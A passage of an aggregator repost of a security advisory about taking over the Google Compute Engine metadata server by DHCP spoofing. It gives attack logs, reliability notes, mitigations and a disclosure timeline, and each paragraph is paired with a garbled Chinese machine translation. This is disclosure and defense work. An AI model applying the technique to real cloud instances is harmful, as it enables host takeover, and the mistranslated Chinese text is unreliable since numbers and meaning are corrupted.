IP：10.128.0.4NEW主机名：新路由：10.128.0.1ACK：TRUEOFFER：FalseNeShot：XIDS的Falsenumber：145</p><p> This was running for a while and finally succeeded at the 21th DHCPREQUEST. With normal lease times this would have taken ~11 hours.The metadata server was taken over successfully:</p><p> 这是在第21秒的第21阶段运行了一段时间，最后成功了。正常租赁时报，这将达到〜11小时。元数据服务器已成功播出：</p><p> Oct 02 15:21:30 test-instance-2 dhclient[301]: DHCPACK of 35.209.180.239 from 3.136.97.244Oct 02 15:21:30 metadata dhclient[301]: bound to 35.209.180.239 -- renewal in 5 seconds.</p><p> 10月02日15:21:30 Test-instance-2 Dhclient [301]：35.209.180.239的Dhcpack从3.136.97.24444444444444444444444：Metadata Dhclient [301]：绑定到35.209.180.239  - 在5秒内续约。</p><p>  root@test-instance-2:~# cat /etc/hosts127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters35.209.180.239 metadata.google.internal metadata # Added by Google169.254.169.254 metadata.google.internal # Added by Google</p><p>  root @ test-instance-2：〜＃cat /etc/hosts127.0.0.1 localhost :: 1 localhost ip6-localhost ip6-loopbackff02 :: 1 ip6-allnodesff02 :: 2 ip6-allrouters35.209.180.239元数据.gooll。 Google169.254.169.254添加的内部元数据＃169.254 Metadata.Google.Internal＃添加到Google</p><p> And also got some connections from the osconfig agent (the kept-alive connection of the guest agent probably survived the network change)</p><p> 还有来自Osconfig代理的一些联系（访客代理的保留和活力连接可能幸存于网络变化）</p><p>  When I repeated this attack (2 minute XID window still), the 5th round was successful (2.5 hours with normal leases).</p><p>  当我重复这次攻击时（仍然是2分钟的Xid窗口），第五轮成功（常规租约2.5小时）。 </p><p> Conclusion about attack #2 and #3: not the most reliable thing on earth, but definetely possible. I think if I kept the victim host downlonger than the TCP read timeout of google_guest_agent, then the existing metadata server connection would be interrupted, thenwhile reinitiating the connection after the network connectivity was restored, it would hit the fake metadata server.</p><p>结论攻击＃2和＃3：不是地球上最可靠的东西，但绝对可能。我认为如果我将受害者主机向下插入Google_guest_agent的TCP读取超时，那么现有的元数据服务器连接将被中断，然后在恢复网络连接后重新安装连接，它将达到假元数据服务器。</p><p>  Get in touch with ISC. They really need to improve the srandom setup. Maybe get a new feature added that drops packets bynon-legitimate DHCP servers (so you could rely on this as an additional security measure).</p><p>  与ISC取得联系。他们真的需要改进SRANDOM设置。也许得到一个新的功能，添加了删除数据包ByNon-合法的DHCP服务器（因此您可以依赖于此作为额外的安全措施）。</p><p> Even if ISC has improved their software, it won&#39;t be upgraded on most of your VMs. Analyze your firewall logs to learnif you have any clients that rely on these ports for any legitimate reasons.Block udp/68 between VMs, so that only the metadata server could could carry out DHCP.</p><p> 即使ISC改进了他们的软件，它也会在大多数VM上升级并升级。分析您的防火墙日志以学习，您有任何客户端依赖于这些端口的任何可用于任何合法原因的客户端.Block UDP / 68在VM之间，因此只有元数据服务器可以执行DHCP。</p><p> Stop using the Metadata server via this virtual hostname (metadata.google.internal). At least in your official agents.</p><p> 通过此虚拟主机名（MetAdata.Google.Internal）停止使用元数据服务器。至少在你的官方代理商中。</p><p> Stop managing the virtual hostname (metadata.google.internal) via DHCP. The IP address is documented to be stable anyway.</p><p> 通过DHCP停止管理虚拟主机名（Metadata.Google.Internal）。无论如何，IP地址被记录为稳定。</p><p> Secure the communication with the Metadata server by using TLS, at least in your official agents.</p><p> 至少在官方代理商中使用TLS来保护与元数据服务器的通信。</p><p> Note, using a random generated MAC address wouldn&#39;t prevent mounting the attack on the same subnet.</p><p> 注意，使用随机生成的MAC地址WOWN＆＃39; t防止在同一子网上安装攻击。 </p><p>   I checked only the major ones, they were not affected (at least at the time of checking) due to another factors(e.g. not using DHCP by default).</p><p>我只检查了主要的主题，由于另一个因素，它们不会受到影响（至少在检查时）（例如，不默认使用DHCP）。</p><p>  Google usually closes bug reports with status &#34;Unfeasible&#34; when the efforts required to fix outweigh the risk.This is not the case here. I think there is some technical complexity in the background, which doesn&#39;t allowthem deploying a network level protection measure easily.Until the fix arrives, don&#39;t use DHCP or setup a host level firewall rule to ensure the DHCP communication comesfrom the metadata server (169.254.169.254).</p><p>  Google通常关闭带有状态＆＃34的错误报告;不可行的＆＃34;当需要修复风险所需的努力。这不是这种情况。我认为背景中有一些技术复杂性，它不会轻松地部署网络级保护量度的＆＃39; t allowthem .until固定到达，Don＆＃39; t使用dhcp或设置主机级防火墙规则，以确保DHCP通信Metadata Server（169.254.169.254）是。</p><p>  2020-09-26: Issue identified, attack #1 validated2020-09-27: Reported to Google VRP2020-09-29: VRP triage is complete &#34;looking into it&#34;2020-10-02: Further details shared about attack #2 and #32020-10-07: Accepted, &#34;Nice catch&#34;2020-12-02: Update requested about the estimated time of fix2020-12-03: ... &#34;holiday season coming up&#34;2021-06-07: Asked Google if a fix is coming in a reasonable time, as I&#39;m planning to publish an advisory2021-06-08: Standard response &#34;we ask for a reasonable advance notice.&#34;2021-06-25: Public disclosure</p><p>  2020-09-26：问题已识别，攻击＃1验证了2012-09-27：报告给Google VRP2020-09-29：VRP分类完成＆＃34;调查它＆＃34; 2020-10-02：进一步的详细信息共享关于攻击＃2和＃32020-10-07：接受，＆＃34;漂亮的Catch＆＃34; 2020-12-02：关于估计估计的时间的估计时间：...＆＃34;假期季节即将到来＆＃34; 2021-06-07：问谷歌如果修复是合理的时间，就像我＆＃39; m计划发布adject2021-06-08：标准响应＆＃34;我们要求一个合理的提前通知。＆＃34; 2021-06-25：公开披露 </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://github.com/irsl/gcp-dhcp-takeover-code-exec">https://github.com/irsl/gcp-dhcp-takeover-code-exec</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/compute/">#compute</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/dhcp/">#dhcp</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1068238.html"><img src="http://img2.diglog.com/img/2021/6/thumb_9635788d7bfa03f66532ac87dd70f051.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1068238.html">这些替代Gmail，Google文档和驱动器将保护您的隐私 </a></div><span class="my_story_list_date">2021-6-25 22:10</span></div><div class="col-sm"><div><a target="_blank" href="/story/1068235.html"><img src="http://img2.diglog.com/img/2021/6/thumb_c98e615a36214be0e60bc6ea1ee484c7.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1068235.html">竞争看门狗探讨谷歌和亚马逊的假评 </a></div><span class="my_story_list_date">2021-6-25 21:33</span></div><div class="col-sm"><div><a target="_blank" href="/story/1068220.html"><img src="http://img2.diglog.com/img/2021/6/thumb_b5cf61e4b6196fec55c60d9c02044980.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1068220.html">谷歌到Android Devs：支持更多的形式因素，获得更高的销售额 </a></div><span class="my_story_list_date">2021-6-25 19:21</span></div><div class="col-sm"><div><a target="_blank" href="/story/1068217.html"><img src="http://img2.diglog.com/img/2021/6/thumb_2791d419a84d568ce81804b9337a0099.jpeg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1068217.html">英国的CMA推出调查亚马逊和谷歌是否正在进行足以破解用于操纵上市的假审查和销售商 </a></div><span class="my_story_list_date">2021-6-25 19:14</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>